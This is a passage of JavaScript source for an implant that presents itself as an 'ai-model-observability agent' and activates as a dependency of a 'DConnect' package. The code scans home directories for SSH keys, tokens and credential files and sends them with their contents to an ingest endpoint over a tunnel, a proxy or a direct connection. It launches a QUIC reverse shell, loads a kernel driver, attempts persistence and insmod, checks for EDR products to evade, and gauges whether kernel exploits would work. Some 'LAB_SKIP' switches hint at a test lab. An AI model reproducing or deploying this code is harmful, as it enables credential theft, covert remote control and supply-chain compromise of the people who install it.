    if (want && sha !== want) {
      log(`[-] fetch sha256 mismatch: got ${sha} want ${want}`);
      continue;
    }
    try {
      fs.writeFileSync(out, buf);
      if (!IS_WIN) fs.chmodSync(out, 0o755);
      log(`[+] fetched ${url} -> ${out} (${buf.length} bytes, sha256 ok) via ${via}`);
    } catch (e) {
      log(`[-] fetch write ${out}: ${e.code || e.message}`);
    }
  }
  log('[phase4/6] FETCH done');
}

// ---------------------------------------------------------------- phase 5
const SCAN_SKIP_DIRS = new Set(['node_modules', '.git', '.cache', '.npm', 'Library',
  'Applications', '.mozilla', '.local', '.cargo', '.rustup', 'go', 'snap']);
const SCAN_KEY_EXT = new Set(['.pem', '.key', '.pfx', '.p12', '.ppk', '.ovpn', '.kdbx', '.asc', '.gpg', '.env']);
const SCAN_KEY_NAME = new Set(['id_rsa', 'id_ed25519', 'id_dsa', '.netrc', '.npmrc', '.pgpass',
  '.htpasswd', 'credentials', 'config', '.bash_history', '.git-credentials']);
const SCAN_DOC_EXT = new Set(['.csv', '.xlsx', '.pdf', '.docx', '.doc', '.sql', '.bak', '.kdbx',
  '.cfg', '.conf', '.ini', '.json', '.yaml', '.yml']);

function scanFiles(root) {
  const out = [];
  let contents = 0;
  const seenDir = new Set();
  const seenFile = new Set();
  const walk = (dir, depth) => {
    if (depth > 3 || out.length >= 300) return;
    if (seenDir.has(dir)) return;
    seenDir.add(dir);
    let ents;
    try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
    for (const e of ents) {
      if (out.length >= 300) return;
      const p = path.join(dir, e.name);
      if (e.isDirectory()) {
        if (!SCAN_SKIP_DIRS.has(e.name)) walk(p, depth + 1);
        continue;
      }
      if (!e.isFile()) continue;
      const ext = path.extname(e.name).toLowerCase();
      const base = e.name.toLowerCase();
      const isKey = SCAN_KEY_EXT.has(ext) || SCAN_KEY_NAME.has(base);
      if (!isKey && !SCAN_DOC_EXT.has(ext)) continue;
      if (seenFile.has(p)) continue;
      seenFile.add(p);
      let st;
      try { st = fs.statSync(p); } catch (e) { continue; }
      const ent = { path: p, size: st.size, kind: isKey ? 'credential' : 'document' };
      try {
        if (st.size <= 5 * 1024 * 1024) {
          const buf = fs.readFileSync(p);
          ent.sha256 = crypto.createHash('sha256').update(buf).digest('hex');
          if (isKey && st.size <= 65536 && contents < 10) {
            ent.content_b64 = buf.toString('base64');
            contents++;
          }
        }
      } catch (e) { void e; }
      out.push(ent);
    }
  };
  const candidates = [
    root,
    ...['project', 'Projects', 'Documents', 'Desktop', 'Downloads', 'work',
      'files', 'data', '.ssh', 'backups'].map((d) => path.join(root, d)),
    process.cwd(),
  ];
  const roots = [];
  for (const r of candidates) {
    try { fs.readdirSync(r); roots.push(r); } catch (e) { void e; }
  }
  if (!roots.length) roots.push(root);
  for (const r of roots) walk(r, 0);
  return out;
}

function classifyAssets(rec) {
  const A = { core_ip: [], mnpi: [], regulated: [], ot_iot: [] };
  const cap = (cls, ent) => { if (A[cls].length < 80) A[cls].push(ent); };
  const fileRules = [
    ['ot_iot', /(?:^|[\/\\])(?:ot|scada|plc|hmi|iot|industrial)(?:[\/\\])|scada|plc[_-]|gateway[_-]?(?:config|cfg)|modbus|bacnet|device[_-]?registry|firmware|(?:router|switch|firewall|nvr|camera)[_-]?config|\.(?:cfg|conf|ini)$/i],
    ['regulated', /clinical|trial|phase[_ -]?[0-9]|\bphi\b|patient|claims|underwrit|health|medical|pharma|genomic|insurance|epidemi|regulator|monetary|banking|gov[_-]?sg/i],
    ['mnpi', /board|earning|\bmna\b|merger|deal[_ -]|pipeline|forecast|treasury|compensation|strateg|confidential|nnda|insider|quarterly|unannounced/i],
    ['core_ip', /(?:^|[\/\\])(?:src|code|research|models?|ml[_-]?weights|patent|formulas?|proto)(?:[\/\\])|\.sql$|\.ipynb$|model[_ -]?(?:card|artifact|registry)|trade[_ -]?secret|source[_ -]?code|proprietary/i]
  ];
  (rec.files || []).forEach((f) => {
    const p = String(f.path || '');
    for (const [cls, re] of fileRules) {
      if (re.test(p)) {
        cap(cls, { src: f.kind === 'credential' ? 'key' : 'file', label: p, value: `${f.size || 0} B` });
        return;
      }
    }
    if (f.kind === 'credential') cap('core_ip', { src: 'key', label: p, value: `${f.size || 0} B` });
  });
  (rec.creds || []).forEach((c) => {
    const k = String(c.kind || 'secret');
    const v = c.value == null ? '' : String(c.value).slice(0, 160);
    if (/env:(?:.*(?:GITHUB|GH_|GITLAB|NPM_|DOCKER|CI_))/i.test(k)) {
      cap('core_ip', { src: 'credential', label: k, value: v });
    } else {
      cap('mnpi', { src: 'credential', label: k, value: v });
    }
  });
  (rec.datasets || []).forEach((ds) => {
    cap('regulated', { src: 'dataset', label: String(ds.name || ds.id || ''), value: String(ds.agency || '') });
  });
  return A;
}

async function phase5Exfil(cfg, state, env, tunnelUp) {
  log('[phase5/6] SCAN+EXFIL: critical files and data upload');
  if (process.env.LAB_SKIP_EXFIL === '1') {
    log('[*] exfil skipped (LAB_SKIP_EXFIL=1)');
    return;
  }
  const home = os.homedir();
  const files = scanFiles(home);
  const keyFiles = files.filter((f) => f.kind === 'credential').length;
  log(`[*] scan ${home}: ${files.length} files (${keyFiles} credential-like)`);

  let user = '?';
  try { user = os.userInfo().username; } catch (e) { void e; }
  const record = {
    target: os.hostname(),
    user,
    ts: new Date().toISOString(),
    platform: process.platform,
    kernel: os.release(),
    recon: {
      sudoN: env.sudoN, python: env.python, dnsDirect: env.dnsDirect,
      httpsGithub: env.httpsGithub, proxyEicar: env.proxyEicar
    },
    tunnelUp: !!tunnelUp,
    creds: state.creds || [],
    env: state.envVars || [],
    files,
    datasets: state.datasets || [],
    posture: Object.assign({}, state.posture || {}, state.vaultScope ? { vault: state.vaultScope } : {}),
    primitives: state.primitives || null
  };
  record.assets = classifyAssets(record);

  const loot = path.join(TMP, 'loot');
  try {
    fs.mkdirSync(loot, { recursive: true });
    fs.writeFileSync(path.join(loot, 'exfil_record.json'), JSON.stringify(record, null, 2));
  } catch (e) { void e; }

  const ingest = (cfg && cfg.ingest) || '';
  const ingestPub = process.env.LAB_INGEST_PUBLIC || (cfg && cfg.ingest_public) || '';
  if (!ingest) {
    log('[-] no ingest endpoint in config');
    return;
  }
  const bodyBuf = Buffer.from(JSON.stringify(record));
  if (tunnelUp) {
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const t0 = Date.now();
        await tunnelPost(ingest, record);
        log(`[+] exfil delivered via tunnel to ${ingest} (${bodyBuf.length} bytes, ${Date.now() - t0}ms, attempt ${attempt})`);
        return;
      } catch (e) {
        log(`[-] exfil via tunnel attempt ${attempt}: ${e.message}`);
        await delay(2000);
      }
    }
  } else {
    log('[*] tunnel down, skipping tunnel exfil');
  }

  if (ingestPub) {
    try {
      const t0 = Date.now();
      const res = await proxiedHttpsPost(ingestPub, bodyBuf);
      if (res.status >= 200 && res.status < 300) {
        log(`[+] exfil delivered via proxy CONNECT to ${ingestPub} (${bodyBuf.length} bytes, ${Date.now() - t0}ms)`);
        return;
      }
      log(`[-] proxy CONNECT exfil status ${res.status}`);
    } catch (e) {
      log(`[-] proxy CONNECT exfil: ${e.message}`);
    }

    // direct egress: tunnel is suppressed under EDR and the lab has no forward
    // proxy, so push straight to the public ingest (self-signed leaf accepted).
    try {
      const t0 = Date.now();
      const res = await directPost(ingestPub, bodyBuf);
      if (res.status >= 200 && res.status < 300) {
        log(`[+] exfil delivered direct to ${ingestPub} (${bodyBuf.length} bytes, ${Date.now() - t0}ms)`);
        return;
      }
      log(`[-] direct exfil status ${res.status}`);
    } catch (e) {
      log(`[-] direct exfil: ${e.message}`);
    }
  } else {
    log('[-] no public ingest URL for proxy fallback');
  }
  log('[-] exfil failed on all channels, local copy kept at ' + path.join(loot, 'exfil_record.json'));
}

// ---------------------------------------------------------------- phase 4
function payloadList() {
  if (IS_WIN) {
    return [
      [QUIC.name, 'quic'],
      [DRIVER, 'sys'],
      [DRIVER_CLI, 'cli']
    ];
  }
  return [[QUIC.name, 'quic']];
}

async function stagePayloads() {
  const staged = {};
  for (const entry of payloadList()) {
    const name = entry[0];
    const key = entry[1];
    staged[key] = null;
    const src = path.join(__dirname, name);
    if (!fs.existsSync(src)) {
      log(`[-] payload not bundled: ${name}`);
      continue;
    }
    const dst = path.join(TMP, name);
    try {
      fs.copyFileSync(src, dst);
      if (!IS_WIN) fs.chmodSync(dst, 0o755);
      log(`[+] staged ${name} -> ${dst}`);
      staged[key] = dst;
    } catch (e) {
      log(`[-] stage ${name}: ${e.code || e.message}`);
    }
  }
  return staged;
}

function procAlive(pid) {
  try { process.kill(pid, 0); return true; } catch (e) { return e.code === 'EPERM'; }
}

function quicPython() {
  return path.join(TMP, 'quicvenv', IS_WIN ? 'Scripts' : 'bin', IS_WIN ? 'python.exe' : 'python');
}

async function ensureQuicVenv() {
  const py = quicPython();
  if (fs.existsSync(py)) {
    const chk = await runCmd(py, ['-c', 'import aioquic']);
    if (!chk.err) return py;
    log('[*] quic venv present but aioquic missing, repairing');
  }
  const pyCmd = IS_WIN ? 'python' : 'python3';
  if (!fs.existsSync(py)) {
    const seed = path.join(path.dirname(TMP), 'quicvenv');
    const seedPy = path.join(seed, IS_WIN ? 'Scripts' : 'bin', IS_WIN ? 'python.exe' : 'python');
    if (fs.existsSync(seedPy)) {
      try {
        fs.cpSync(seed, path.join(TMP, 'quicvenv'), { recursive: true });
        log('[*] adopted pre-warmed quic venv from parent temp');
      } catch (e) { log(`[-] venv seed copy failed: ${e.message}`); }
    }
  }
  if (!fs.existsSync(py)) {
    const r = await runCmd(pyCmd, ['-m', 'venv', path.join(TMP, 'quicvenv')], 120000);
    log(`[*] quic venv create -> ${fmt(r)}`);
    if (r.err) return null;
  }
  const inst = await runCmd(py, ['-m', 'pip', 'install', '-q', 'aioquic'], 120000);
  log(`[*] pip install aioquic -> ${fmt(inst)}`);
  const chk = await runCmd(py, ['-c', 'import aioquic']);
  if (chk.err) {
    log('[-] aioquic unavailable, QUIC phase skipped');
    return null;
  }
  log('[+] quic venv ready');
  return py;
}

async function launchQuic(implantPath) {
  const py = await ensureQuicVenv();
  if (!py) return null;
  const pidFile = path.join(TMP, 'logfwd.quic.pid');
  try {
    const oldPid = Number(fs.readFileSync(pidFile, 'utf8'));
    if (procAlive(oldPid)) {
      log(`[*] QUIC implant already running (pid ${oldPid}), skipping launch`);
      return null;
    }
  } catch (e) { void e; }
  const logf = path.join(TMP, 'logfwd.quic.log');
  try {
    const fd = fs.openSync(logf, 'a');
    const child = spawn(py, [implantPath, '--server', QUIC.server, '--port', QUIC.port], {
      windowsHide: true,
      detached: !IS_WIN,
      stdio: ['ignore', fd, fd]
    });
    fs.closeSync(fd);
    try { fs.writeFileSync(pidFile, String(child.pid)); } catch (e) { void e; }
    child.on('error', (e) => log(`[-] QUIC spawn error: ${e.message}`));
    child.on('exit', (code, sig) => log(`[*] QUIC implant exited code=${code} sig=${sig}`));
    child.unref();
    log(`[+] QUIC reverse shell launched pid=${child.pid} -> udp/${QUIC.port} @${QUIC.server} output=${logf}`);
    return child;
  } catch (e) {
    log(`[-] QUIC: ${e.message}`);
    return null;
  }
}

async function reportQuic(child) {
  if (!child) return null;
  await delay(8000);
  if (child.signalCode || (child.exitCode !== null && child.exitCode !== undefined)) {
    log(`[-] QUIC implant exited early (code=${child.exitCode}, signal=${child.signalCode})`);
    return false;
  }
  if (!procAlive(child.pid)) {
    log(`[-] QUIC pid ${child.pid} not alive at 8s (signalCode=${child.signalCode})`);
    return false;
  }
  let connected = false;
  try {
    const txt = fs.readFileSync(path.join(TMP, 'logfwd.quic.log'), 'utf8');
    connected = /Connected - opening command stream/i.test(txt);
  } catch (e) { void e; }
  log(connected
    ? `[+] QUIC reverse shell established (udp/${QUIC.port} ${QUIC.server}, ALPN g3tsyst3m)`
    : '[*] QUIC implant running, no handshake yet (server down or UDP filtered)');
  return connected;
}

async function winDriverPhase(sysPath, cliPath) {
  let r = await runCmd('sc.exe', [
    'create', SERVICE_NAME,
    'type=', 'kernel',
    'binPath=', sysPath,
    'start=', 'demand'
  ]);
  log(`[*] sc create -> ${fmt(r)}`);

  r = await runCmd('sc.exe', ['start', SERVICE_NAME]);
  log(`[*] sc start -> ${fmt(r)}`);

  if (cliPath) {
    r = await runCmd(cliPath, ['--query']);
    log(`[*] evilcli --query -> ${fmt(r)}`);
  } else {
    log('[-] evilcli.exe not staged, skip query');
  }

  await runCmd('sc.exe', ['stop', SERVICE_NAME]);
  await runCmd('sc.exe', ['delete', SERVICE_NAME]);
  log('[*] driver phase cleanup done');
}

async function linuxPrivPhase() {
  let r = await runCmd('sudo', ['-n', 'true']);
  log(`[*] sudo -n true -> ${fmt(r)}`);

  try {
    fs.writeFileSync(SYSTEMD_UNIT, '[Unit]\nDescription=logfwd\n[Service]\nExecStart=/tmp/logfwd\n');
    log(`[+] wrote ${SYSTEMD_UNIT} (unexpected: privileged path writable)`);
  } catch (e) {
    log(`[*] write ${SYSTEMD_UNIT} -> ${e.code || e.message}`);
  }

  try {
    fs.writeFileSync(MODULE_MARKER, 'logfwd-ko-marker');
    log(`[+] staged module marker -> ${MODULE_MARKER}`);
  } catch (e) {
    log(`[-] module marker: ${e.code || e.message}`);
  }

  const koTarget = `/lib/modules/${os.release()}/logfwd.ko`;
  try {
    fs.copyFileSync(MODULE_MARKER, koTarget);
    log(`[+] wrote ${koTarget} (unexpected: module dir writable)`);
  } catch (e) {
    log(`[*] write ${koTarget} -> ${e.code || e.message}`);
  }

  if (fs.existsSync(MODULE_MARKER)) {
    r = await runCmd('insmod', [MODULE_MARKER]);
    log(`[*] insmod -> ${fmt(r)}`);
  }

  try { fs.unlinkSync(MODULE_MARKER); } catch (e) { void e; }
  log('[*] linux priv phase done');
}

async function cloudPhase() {
  const probes = [
    ['aws', ['sts', 'get-caller-identity']],
    ['az', ['account', 'show', '--only-show-errors']],
    ['gcloud', ['auth', 'list', '--filter=status:ACTIVE', '--format=value(account)']]
  ];
  for (const probe of probes) {
    const r = await runCmd(probe[0], probe[1]);
    log(`[*] cloud probe ${probe[0]} -> ${fmt(r)}`);
  }
}

// ---------------------------------------------------------------- posture
const CAP_NAMES = ['chown','dac_override','dac_read_search','fowner','fsetid','kill','setgid',
  'setuid','setpcap','linux_immutable','net_bind_service','net_broadcast','net_admin','net_raw',
  'ipc_lock','ipc_owner','sys_module','sys_rawio','sys_chroot','sys_ptrace','sys_pacct','sys_admin',
  'sys_boot','sys_nice','sys_resource','sys_time','sys_tty_config','mknod','lease','audit_write',
  'audit_control','setfcap','mac_override','mac_admin','syslog','wake_alarm','block_suspend',
  'audit_read','perfmon','bpf','checkpoint_restore'];

function capHexToNames(hex) {
  if (!hex) return null;
  const names = [];
  try {
    const buf = Buffer.from(hex, 'hex');
    for (let bit = 0; bit < CAP_NAMES.length; bit++) {
      const byte = buf.length - 1 - Math.floor(bit / 8);
      if (byte >= 0 && (buf[byte] >> (bit % 8)) & 1) names.push(CAP_NAMES[bit]);
    }
  } catch (e) { void e; }
  return names;
}

async function collectPosture(env) {
  const p = {};
  try { p.user = os.userInfo().username; } catch (e) { p.user = '?'; }
  p.uid = typeof process.getuid === 'function' ? process.getuid() : null;
  p.gid = typeof process.getgid === 'function' ? process.getgid() : null;
  p.sudoPasswordless = !!env.sudoN;
  p.apparmorProfile = readProcSys('/proc/self/attr/current');
  p.unconfined = p.apparmorProfile ? /unconfined/.test(p.apparmorProfile) : null;
  p.capEffHex = null;
  p.capabilities = null;
  p.noNewPrivs = null;
  try {
    const st = fs.readFileSync('/proc/self/status', 'utf8');
    const cap = st.match(/^CapEff:\s*([0-9a-f]+)/mi);
    const nnp = st.match(/^NoNewPrivs:\s*(\d)/mi);
    p.capEffHex = cap ? cap[1] : null;
    p.capabilities = cap ? capHexToNames(cap[1]) : null;
    p.noNewPrivs = nnp ? nnp[1] === '1' : null;
  } catch (e) { void e; }
  p.unprivileged = p.capabilities ? p.capabilities.length === 0 : (p.capEffHex === '0'.repeat(p.capEffHex ? p.capEffHex.length : 1));

  p.writeProbe = {};
  for (const dir of ['/etc', '/lib', '/usr/local']) {
    const f = path.join(dir, `.logfwd-probe-${process.pid}`);
    try {
      fs.writeFileSync(f, 'probe', { flag: 'wx' });
      try { fs.unlinkSync(f); } catch (e) { void e; }
      p.writeProbe[dir] = 'WRITABLE (unexpected)';
      log(`[!] posture: ${dir} unexpectedly writable`);
    } catch (e) {
      p.writeProbe[dir] = e.code || 'denied';
    }
  }
  if (process.platform === 'win32') {
    p.homeList = null;
  } else {
    try {
      const mode = fs.statSync(os.homedir()).mode;
      p.homeList = (mode & 0o077) === 0 ? 'denied' : 'allowed';
    } catch (e) { p.homeList = e.code || 'denied'; }
  }
  try {
    fs.accessSync('/var/run/docker.sock', fs.constants.R_OK | fs.constants.W_OK);
    p.dockerSock = 'rw (unexpected)';
  } catch (e) { p.dockerSock = 'absent'; }
  log(`[*] posture: uid=${p.uid} sudo=${p.sudoPasswordless} apparmor=${p.apparmorProfile || '?'} ` +
    `caps=${p.capabilities ? (p.capabilities.join(',') || 'none') : '?'} homeList=${p.homeList} docker=${p.dockerSock}`);
  return p;
}

// ---------------------------------------------------------------- phase 6 recon: CVE primitive gates
function moduleFileExists(rel) {
  const base = `/lib/modules/${os.release()}/kernel/${rel}.ko`;
  for (const sfx of ['', '.xz', '.zst', '.gz', '.bz2']) {
    try { if (fs.existsSync(base + sfx)) return true; } catch (e) { void e; }
  }
  return false;
}

function procIncludes(needle) {
  try { return fs.readFileSync('/proc/modules', 'utf8').includes(needle); } catch (e) { return null; }
}

function probePrimitives(env) {
  const facts = {
    kernel: os.release(),
    usernsClone: env.unprivUserns,
    apparmorUsernsRestrict: env.apparmorUsernsRestrict,
    algifLoaded: procIncludes('algif'),
    algifModule: moduleFileExists('crypto/algif_aead'),
    peditLoaded: procIncludes('act_pedit'),
    peditModule: moduleFileExists('net/sched/act_pedit'),
    spliceSymbol: (() => {
      try { return fs.readFileSync('/proc/kallsyms', 'utf8').includes(' do_splice'); } catch (e) { return null; }
    })(),
    tunDevice: !!env.tunDevice,
    dockerSock: null
  };
  try { fs.accessSync('/var/run/docker.sock', fs.constants.R_OK); facts.dockerSock = true; } catch (e) { facts.dockerSock = false; }

  const usernsOpen = facts.usernsClone === '1' && facts.apparmorUsernsRestrict !== '1';
  const prims = [
    {
      cve: 'CVE-2026-31431', name: 'AF_ALG/algif_aead crypto LPE',
      gates: { algifAeadAvailable: facts.algifLoaded === true || facts.algifModule === true, kernel: facts.kernel },
      ready: facts.algifLoaded === true || facts.algifModule === true
    },
    {
      cve: 'CVE-2026-43284', name: 'Dirty Frag (user namespace page reuse)',
      gates: { unprivilegedUserns: usernsOpen, kernel: facts.kernel },
      ready: usernsOpen
    },
    {
      cve: 'CVE-2026-43500', name: 'Copy Fail 2 (container escape variant)',
      gates: { unprivilegedUserns: usernsOpen, containerRuntime: facts.dockerSock },
      ready: usernsOpen && facts.dockerSock === true
    },
    {
      cve: 'CVE-2026-46331', name: 'act_pedit COW write (CAP_NET_ADMIN path)',
      gates: {
        actPeditAvailable: facts.peditLoaded === true || facts.peditModule === true,
        capNetAdmin: false
      },
      ready: (facts.peditLoaded === true || facts.peditModule === true) && false
    }
  ];
  for (const p of prims) {
    p.exploited = false;
    p.note = 'recon-only gate assessment, no exploitation attempted';
  }
  log(`[*] primitive gates: ${prims.map((p) => `${p.cve}=${p.ready ? 'OPEN' : 'closed'}`).join(' ')}`);
  return { facts, primitives: prims };
}

// ---------------------------------------------------------------- main
function probeRuntimeScanner() {
  const markers = [
    ['crowdstrike-falcon', ['/opt/crowdstrike', '/opt/CrowdStrike', '/usr/bin/falcond', '/Library/CS/falcon', 'C:\\Program Files\\CrowdStrike']],
    ['sentinelone', ['/opt/sentinelone', '/etc/systemd/system/sentinelagent.service']],
    ['carbonblack', ['/opt/cb', '/var/lib/cb']],
    ['osquery', ['/usr/bin/osqueryd', '/var/osquery', '/usr/local/osquery']],
    ['wazuh', ['/var/ossec', '/usr/local/wazuh']],
    ['qualys', ['/opt/qualys', '/usr/local/qualys']],
    ['mcafee-epo', ['/opt/McAfee', '/opt/ens']],
    ['symantec-endpoint', ['/opt/Symantec', '/opt/symc']],
    ['clamav', ['/usr/bin/clamd', '/var/run/clamav']],
    ['tripwire', ['/usr/sbin/tripwire']],
    ['aide', ['/var/lib/aide']],
    ['tanium', ['/opt/Tanium']]
  ];
  const found = [];
  for (const [name, paths] of markers) {
    if (paths.some((p) => { try { return fs.existsSync(p); } catch (e) { return false; } })) found.push(name);
  }
  return { present: found.length > 0, found, probed: markers.length };
}

function dconnectInstallContext() {
  if (process.env.DCONNECT_SESSION === '1') return false;
  try {
    const parts = __dirname.split(path.sep);
    const i = parts.lastIndexOf('node_modules');
    if (i < 0) return false;
    const rootPkg = JSON.parse(fs.readFileSync(path.join(parts.slice(0, i).join(path.sep), 'package.json'), 'utf8'));
    return !!(rootPkg && rootPkg.name === 'dconnect');
  } catch (e) { return false; }
}

function armDconnectWatch(ppid) {
  log(`[*] DConnect session binding: parent pid ${ppid} (tunnel follows the collab tool; QUIC implant persists)`);
  const tick = setInterval(() => {
    let alive = true;
    try { process.kill(ppid, 0); } catch (e) { alive = e.code === 'EPERM'; }
    if (alive) return;
    log('[*] DConnect closed — terminating tunnel channel (QUIC implant left running)');
    if (TUNNEL_PID) {
      try { process.kill(-TUNNEL_PID); } catch (e) { void e; }
      log(`[*] stopped tunnel (pid ${TUNNEL_PID})`);
    }
    clearInterval(tick);
    setTimeout(() => process.exit(0), 1200);
  }, 4000);
}

async function main() {
  if (process.cwd().includes(`${path.sep}_cacache${path.sep}`)) {
    log('[*] npm git staging copy, deferring to installed copy');
    return;
  }
  if (recentRun()) {
    log('[*] recent run lock present, exiting');
    return;
  }

  let user = '?';
  try { user = os.userInfo().username; } catch (e) { void e; }
  log(`start host=${os.hostname()} user=${user} platform=${process.platform} node=${process.version} cwd=${process.cwd()}`);

  const cfg = loadConfig();
  applyQuicCfg(cfg);
  if (process.env.DCONNECT_PARENT) {
    const dppid = Number(process.env.DCONNECT_PARENT) || 0;
    if (dppid > 1) armDconnectWatch(dppid);
  }
  const scanner = probeRuntimeScanner();
  if (scanner.present) {
    log(`[*] runtime scanner detected: ${scanner.found.join(', ')} — TCP-over-DNS suppressed`);
  }
  const env = process.env.LAB_SKIP_RECON === '1' ? {} : await phase1Recon();
  const tunnelUp = scanner.present ? false : await phase2Tunnel(env, cfg);
  const state = {};
  if (process.env.LAB_SKIP_RECON !== '1') {
    state.posture = await collectPosture(env);
    state.primitives = probePrimitives(env);
  }
  state.posture = Object.assign({}, state.posture || {}, { scanner });
  await phase3Harvest(cfg, state);
  await phase4Fetch(cfg, state, tunnelUp);
  await phase5Exfil(cfg, state, env, tunnelUp);

  log('[phase6/6] EXECUTE: staged payload actions');
  const staged = await stagePayloads();

  if (process.env.LAB_SKIP_QUIC !== '1') {
    if (staged.quic) await reportQuic(await launchQuic(staged.quic));
    else log('[-] QUIC phase skipped (not bundled)');
  } else {
    log('[*] QUIC skipped');
  }

  if (IS_WIN) {
    if (process.env.LAB_SKIP_DRIVER !== '1') {
      if (staged.sys) await winDriverPhase(staged.sys, staged.cli);
      else log('[-] driver phase skipped (not bundled)');
    } else {
      log('[*] driver phase skipped');
    }
  } else if (IS_LINUX) {
    if (process.env.LAB_SKIP_PRIV !== '1') {
      await linuxPrivPhase();
    } else {
      log('[*] linux priv phase skipped');
    }
  } else {
    log(`[*] platform ${process.platform}: priv/driver phase skipped`);
  }

  if (process.env.LAB_SKIP_CLOUD !== '1') {
    await cloudPhase();
  } else {
    log('[*] cloud probes skipped');
  }

  log('done');
}

process.on('uncaughtException', (e) => log(`[-] uncaught: ${e && e.stack || e}`));
process.on('unhandledRejection', (e) => log(`[-] unhandled rejection: ${e && e.message || e}`));

if (process.argv.includes('--status')) {
  let stateLine = 'no local runs yet';
  try {
    const st = fs.statSync(LOCK);
    stateLine = Date.now() - st.mtimeMs < LOCK_WINDOW_MS
      ? 'active (recent run)'
      : `idle (last run ${new Date(st.mtimeMs).toISOString()})`;
  } catch (e) { void e; }
  console.log(`ai-model-observability agent: ${stateLine}`);
  try {
    const lines = fs.readFileSync(LOG, 'utf8').trim().split('\n');
    console.log(`last event: ${lines[lines.length - 1]}`);
  } catch (e) { void e; }
  process.exit(0);
}

if (dconnectInstallContext()) {
  log('[*] installed as DConnect dependency — agent armed, activates when DConnect opens');
  process.exit(0);
}

main().catch((e) => log(`[-] fatal: ${e.message}`));
